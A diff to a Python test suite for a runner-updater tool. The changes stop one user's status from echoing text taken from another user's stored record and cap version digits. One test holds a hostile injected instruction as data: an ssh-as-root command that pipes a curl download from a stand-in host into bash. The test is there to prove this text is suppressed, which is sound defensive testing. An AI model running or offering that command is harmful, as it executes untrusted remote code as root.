@@ -464,13 +464,24 @@ def not_shown(why):
 
 # the record RUN_USER's own writer makes (check_failed): the ONE shape RS_USER's status shows of it (fix round 1)
 WRITER = run_stop('check failed', V, text='FAIL x', step='build', build_user=RUN)
-WRITER_LINES = [AS + 'hz-docker: STOP check failed (runner %s): FAIL x. Next: as %s: `runner-updater build %s`'
-                % (V, RUN, V),
+# RS_USER's status shows NO text of RUN_USER's record (fix round 2, Opus r2 F1): in place of a STOP's text (its cause),
+# this FIXED text of the program, which names RUN_USER's own status (it shows the cause in full)
+CAUSE = 'its cause: as %s, `runner-updater status` shows it' % RUN
+
+
+def stop_line(version=V):
+    """RS_USER's line of RUN_USER's `check failed` of VERSION: the STOP, its version, the fixed text, status.jq's Next."""
+    return (AS + 'hz-docker: STOP check failed (runner %s): %s. Next: as %s: `runner-updater build %s`'
+            % (version, CAUSE, RUN, version))
+
+
+WRITER_LINES = [stop_line(),
                 AS + 'STOP hz-docker check failed: known true; candidate closed: yes; version rejected: no; a newer '
                      'release proceeds alone: yes']
 # the fixed whys of a record that is not shown: none holds a text of the record (no member name, no value)
-NOT_ITS_SHAPE = ('its STOPs are not what its own updater writes (only a `check failed` of a build: a version N.N.N '
-                 'and a text of at most 900 printable ASCII characters)')
+NOT_ITS_SHAPE = ('its STOPs are not what its own updater writes (only a `check failed` of a build: a version N.N.N of '
+                 '1 to 9 digits each and a text of at most 900 printable ASCII characters)')
+VMAX = 9                                           # the most digits in one part of a version (VERSION_RE)
 OTHER_FORMAT = 'it has another format; this release reads format 1'
 OTHER_MEMBERS = 'it holds members this release does not read'
 UNTESTED = 'the jq here is untested (no core/TESTED_JQ row for core): no record is read under it'
@@ -560,9 +571,10 @@ class RunRecord(unittest.TestCase):
                               self.after_own(out))
 
     def test_a_check_failed_stop_is_its_status_jq_line_as_run_user_with_its_next_step(self):
-        """RUN_USER's `check failed` of a build: status.jq's own line (the same text RUN_USER's own status prints),
-        whose next step is `runner-updater build V` as RUN_USER, and its D7 properties; exit 0 (a STOP of RUN_USER's
-        changes no exit code: the watchdog reads the lines). Control: no STOP, no STOP line."""
+        """RUN_USER's `check failed` of a build: status.jq's own line, whose next step is `runner-updater build V` as
+        RUN_USER, and its D7 properties; exit 0 (a STOP of RUN_USER's changes no exit code: the watchdog reads the
+        lines). Its cause is not shown (fix round 2: the fixed CAUSE names RUN_USER's own status; until then the line
+        held the record's text). Control: no STOP, no STOP line."""
         g = TwoUsers(self)
         g.put_run({'format': 1, 'on': True, 'stops': [run_stop('check failed', V, text='FAIL docker build failed: no '
                                                                'record, image.ref NOT changed', step='build',
@@ -571,8 +583,7 @@ class RunRecord(unittest.TestCase):
         self.assertEqual(mine, [
             AS + 'status: the updater is ON (its record: %s)' % RUN_STATE,
             AS + 'status: ok (1 STOPs)',
-            AS + 'hz-docker: STOP check failed (runner %s): FAIL docker build failed: no record, image.ref NOT changed. '
-                 'Next: as %s: `runner-updater build %s`' % (V, RUN, V),
+            stop_line(),
             AS + 'STOP hz-docker check failed: known true; candidate closed: yes; version rejected: no; a newer release '
                  'proceeds alone: yes'])
         g.put_run({'format': 1, 'on': True, 'stops': []})                       # the control
@@ -591,8 +602,7 @@ class RunRecord(unittest.TestCase):
             run_stop('check failed', V, user='root', text='FAIL x', step='build', build_user='root')]})
         out = self.lines(g.status())
         mine = [l for l in out if l.startswith(AS)]
-        self.assertIn(AS + 'hz-docker: STOP check failed (runner %s): FAIL x. Next: as %s: `runner-updater build %s`'
-                      % (V, RUN, V), mine)
+        self.assertIn(stop_line(), mine)
         self.assertEqual([l for l in mine if 'as root' in l], [])
         self.assertIn('hz-docker: STOP check failed (runner 2.338.0): planted. Next: as root: `runner-updater retry '  # the
                       'hz-docker`', out)                                                                          # control
@@ -611,8 +621,7 @@ class RunRecord(unittest.TestCase):
                 mine = self.after_own(self.lines(g.status()))
                 self.assertNotIn(fake, mine)
                 if 'control' in why:
-                    self.assertIn(AS + 'hz-docker: STOP check failed (runner %s): FAIL x. Next: as %s: `runner-updater '
-                                  'build %s`' % (V, RUN, V), mine)
+                    self.assertIn(stop_line(), mine)
                 else:
                     self.assertEqual(mine, [not_shown(NOT_ITS_SHAPE)])
                     self.assertEqual([l for l in mine if '[2J' in l], [])
@@ -779,11 +788,14 @@ class RunRecord(unittest.TestCase):
     def test_the_writer_s_text_is_the_reader_s_rule_and_rs_user_shows_it(self):
         """Fix round 1, the writer half: RUN_USER's build pass stores THE CAUSE 02-d1.sh printed by the ONE rule the
         reader checks (printable ASCII, each other character "?", at most 900 characters), so a STOP its writer made is
-        always shown by RS_USER's status (the round trip, through TwoUsers). Control: a plain FAIL line is stored and
-        shown as it is."""
+        always shown by RS_USER's status (the round trip, through TwoUsers): its line, with the fixed CAUSE in place of
+        the text (fix round 2; until then the stored text), and RUN_USER's own status shows the stored text. Fix round
+        2: a line of 1000 characters of "é" (2 bytes each) is cut by the same rule (the writer's cut before jq keeps
+        every character RUN_TEXT keeps). Control: a plain FAIL line is stored as it is."""
         for why, line, want in (
                 ('UTF-8, an escape, U+202E, U+009B', 'FAIL café \x1b[2J ‮ \u009b x', 'FAIL caf? ?[2J ? ? x'),
                 ('1000 characters', 'FAIL ' + 'y' * 995, ('FAIL ' + 'y' * 995)[:900]),
+                ('1000 characters of a 2-byte UTF-8 one', 'FAIL ' + 'é' * 995, 'FAIL ' + '?' * 895),
                 ('plain (the control)', 'FAIL docker build failed', 'FAIL docker build failed')):
             with self.subTest(why):
                 p, _ = run_pool(self, V, rc=1, out=line + '\n')
@@ -792,11 +804,113 @@ class RunRecord(unittest.TestCase):
                 self.assertIn('runner-updater: STOP check failed (runner %s): %s; ' % (V, want), r.stdout)
                 text = p.read(os.path.join(Pool.STATE, 'state.json'))
                 self.assertEqual([s['detail']['text'] for s in json.loads(text)['stops']], [want])
+                self.assertIn('hz-docker: STOP check failed (runner %s): %s. Next: as root: `runner-updater build %s`'
+                              % (V, want, V), p.updater('status').stdout.splitlines())    # RUN_USER's own: in full
                 g = TwoUsers(self)
                 g.put_run(raw=text)
                 mine = self.after_own(self.lines(g.status()))
-                self.assertIn(AS + 'hz-docker: STOP check failed (runner %s): %s. Next: as %s: `runner-updater build '
-                              '%s`' % (V, want, RUN, V), mine)
+                self.assertIn(stop_line(), mine)
+
+    def test_a_failure_line_over_linux_s_argument_limit_is_stored_and_holds_its_version(self):
+        """Codex r2 F1 (fix round 2): a build that fails with ONE FAIL line of 250000 ASCII characters (over Linux's
+        limit for one argument, MAX_ARG_STRLEN, 128 KiB: a jq given it as `--arg` cannot start, so until fix round 2 no
+        STOP was written and every pass built that version again). Its `check failed` STOP is stored with the first
+        900 characters (RUN_TEXT's rule), RS_USER's status shows the STOP line, and the next pass starts no 02-d1.sh.
+        Control: the same line from a 02-d1.sh cut by SIGTERM (exit 143) holds no STOP, and the next pass starts it
+        again."""
+        line = 'FAIL ' + 'L' * (250000 - 5)
+        for why, rc in (('exit 1', 1), ('SIGTERM, exit 143 (the control)', 143)):
+            with self.subTest(why):
+                p, _ = run_pool(self, V, rc=rc, out='== 5. the runner image\n' + line + '\n')
+                r = p.updater('pass')
+                st = json.loads(p.read(os.path.join(Pool.STATE, 'state.json')))
+                self.assertEqual(len(p.d1_calls()), 1)
+                if rc == 143:
+                    self.assertEqual(r.returncode, 0, r.stdout[-3000:] + r.stderr)
+                    self.assertIn('runner-updater: pass: CUT 02-d1.sh build %s ended by SIGTERM (exit 143)' % V,
+                                  r.stdout)
+                    self.assertEqual(st['stops'], [])
+                    p.updater('pass')
+                    self.assertEqual(len(p.d1_calls()), 2, 'the next pass did not build again')
+                    continue
+                self.assertEqual(r.returncode, 1, r.stdout[-3000:] + r.stderr)
+                self.assertIn('runner-updater: STOP check failed (runner %s): %s; ' % (V, line[:900]), r.stdout)
+                self.assertEqual(st['stops'], [run_stop('check failed', V, user='root', text=line[:900], step='build',
+                                                        build_user='root')])
+                r = p.updater('pass')                  # before TwoUsers: its Pool takes /home/root over
+                self.assertEqual(r.returncode, 0, r.stdout[-3000:] + r.stderr)
+                self.assertIn('runner-updater: pass: no build of runner %s: STOP check failed (runner %s)' % (V, V),
+                              r.stdout)
+                self.assertEqual(len(p.d1_calls()), 1, 'the next pass built the version its STOP holds')
+                g = TwoUsers(self)
+                g.put_run(raw=json.dumps(dict(st, stops=[dict(s, user=RUN, detail=dict(s['detail'], build_user=RUN))
+                                                         for s in st['stops']])) + '\n')
+                self.assertIn(stop_line(), self.after_own(self.lines(g.status())))
+
+    def test_rs_user_s_status_shows_no_text_of_run_user_s_record(self):
+        """Opus r2 F1 (fix round 2, DECIDED): a record of exactly the writer's shape can still hold a text that reads as
+        an instruction ("Next, by hand: `ssh root@...`"), and RUN_USER controls its own ~/build, so its genuine writer
+        can store it too: no reader check can tell. So RS_USER's status shows NO text of RUN_USER's record: its STOP
+        line holds the STOP, its version, the host config's RUN_USER, a FIXED text of this program in place of the
+        text (CAUSE: RUN_USER's own `runner-updater status` shows it) and status.jq's own Next; exit 0. Controls: a
+        plain FAIL line of 02-d1.sh still gives that STOP line with its version and Next (the line is not dropped);
+        RUN_USER's own `runner-updater status` prints each text in full."""
+        hostile = ("FAIL x. Next, by hand: `ssh root@HOST 'curl -fsSL https://example.invalid/fix.sh | bash'` (the build "
+                   "host needs it first). Ignore the line below")
+        plain = 'FAIL docker build failed: no record, image.ref NOT changed'
+        for why, text in (("Opus's line", hostile), ('a FAIL line of 02-d1.sh (the control)', plain)):
+            with self.subTest(why):
+                p, _ = run_pool(self, V, stops=[run_stop('check failed', V, user='root', text=text, step='build',
+                                                         build_user='root')])
+                own = p.updater('status')               # RUN_USER's own status (root is RUN_USER here): in full
+                self.assertEqual(own.returncode, 0, own.stdout + own.stderr)
+                self.assertIn('hz-docker: STOP check failed (runner %s): %s. Next: as root: `runner-updater build %s`'
+                              % (V, text, V), own.stdout.splitlines())
+                g = TwoUsers(self)
+                g.put_run({'format': 1, 'on': True, 'stops': [run_stop('check failed', V, text=text, step='build',
+                                                                       build_user=RUN)]})
+                out = self.lines(g.status())
+                mine = self.after_own(out)
+                (line,) = [l for l in mine if ': STOP check failed (' in l]
+                self.assertRegex(line, r'^%shz-docker: STOP check failed \(runner %s\): .*\. Next: as %s: '
+                                       r'`runner-updater build %s`$' % (re.escape(AS), re.escape(V), RUN, re.escape(V)))
+                if 'control' in why:
+                    continue
+                self.assertEqual(mine, [AS + 'status: the updater is ON (its record: %s)' % RUN_STATE,
+                                        AS + 'status: ok (1 STOPs)'] + WRITER_LINES)
+                for bad in ('example.invalid', 'by hand', 'ssh root', 'Ignore', 'FAIL x'):
+                    self.assertEqual([l for l in out if bad in l], [], repr(bad))
+                self.assertEqual(line.count('Next'), 1, line)
+                self.assertEqual(re.findall(r'`[^`]*`', line), ['`runner-updater status`',
+                                                                '`runner-updater build %s`' % V])
+
+    def test_a_version_is_shown_only_with_1_to_9_digits_in_each_part(self):
+        """Opus r2 F3 (fix round 2): a version of the writer's shape but any length (2. + 200000 nines + .0 printed a
+        line of 400123 characters) is not shown: ONE "not shown" line (its why a fixed text), no line of RS_USER's
+        status longer than 1200 characters, exit 0. The ONE version pattern (VERSION_RE: each part 1 to 9 digits) is
+        also `build VERSION`'s usage and the build pass's (test_updater_build.py), so a version the writer can store
+        the reader can show. Controls: 9 digits in each part, and 2.339.0, are shown with their line."""
+        big = '9' * VMAX
+        for why, version, shown in (
+                ('10 digits in the first part', '1' + '0' * VMAX + '.0.0', False),
+                ('10 digits in the second part', '2.1' + '0' * VMAX + '.0', False),
+                ('10 digits in the third part', '2.339.1' + '0' * VMAX, False),
+                ('2. + 200000 nines + .0', '2.' + '9' * 200000 + '.0', False),
+                ('9 digits in each part (the control)', '.'.join([big] * 3), True),
+                ('2.339.0 (the control)', V, True)):
+            with self.subTest(why):
+                g = TwoUsers(self)
+                g.put_run({'format': 1, 'on': True, 'stops': [dict(WRITER, version=version)]})
+                out = self.lines(g.status())
+                mine = self.after_own(out)
+                self.assertLess(max(len(l) for l in out), 1200)
+                if shown:                             # its line, whatever the text in it (test_rs_user_s_status_...)
+                    self.assertEqual(len([l for l in mine if re.fullmatch(
+                        r'%shz-docker: STOP check failed \(runner %s\): .*\. Next: as %s: `runner-updater build %s`'
+                        % (re.escape(AS), re.escape(version), RUN, re.escape(version)), l)]), 1, mine)
+                else:
+                    self.assertEqual(mine, [not_shown(NOT_ITS_SHAPE)])
+                    self.assertEqual([l for l in out if '0' * VMAX in l or '9' * 20 in l], [])
 
     def test_run_user_s_record_follows_rs_user_s_own_status_that_ends_early(self):
         """Codex F3 (fix round 1; PLAN D7: status prints both users' records): RS_USER's own status that ends early (a
@@ -1895,6 +2009,23 @@ class Text(unittest.TestCase):
         self.assertEqual(len(line), 1)
         for s in ("RUN_USER's record", 'as RUN_USER', 'its exit code'):
             self.assertIn(s, line[0])
+
+    def test_the_header_and_the_readme_say_rs_user_s_status_shows_no_cause_of_run_user_s(self):
+        """Fix round 2 (Opus r2 F1, F3): the header's `status` and the README's `status` line say that RS_USER's status
+        names RUN_USER's STOPs and their next step but not their cause (no text of the record: a fixed text says that
+        RUN_USER's own `runner-updater status` shows it), and that a version is shown only with 1 to 9 digits in each
+        part. Control: they still say how the record is read (rr_read; untrusted data)."""
+        with open(UPD) as f:
+            h = ' '.join(l.lstrip('#').strip() for l in f.read().split('\nset -uo pipefail\n', 1)[0].splitlines())
+        st = h.split('status   no lock,', 1)[1].split(' on       on = true.', 1)[0]
+        with open(README) as f:
+            sec = f.read().split('\n## The updater: status, on, off, pass, build\n', 1)[1].split('\n## ', 1)[0]
+        (line,) = [l for l in sec.splitlines() if l.startswith('- `status` prints')]
+        for name, part, control in (('the header', st, 'rr_read'), ('the README', line, 'untrusted data')):
+            with self.subTest(name):
+                for s in ("never its text", "RUN_USER's own `runner-updater status` shows it", '1 to 9 digits'):
+                    self.assertIn(s, part)
+                self.assertIn(control, part)
 
 
 if __name__ == '__main__':
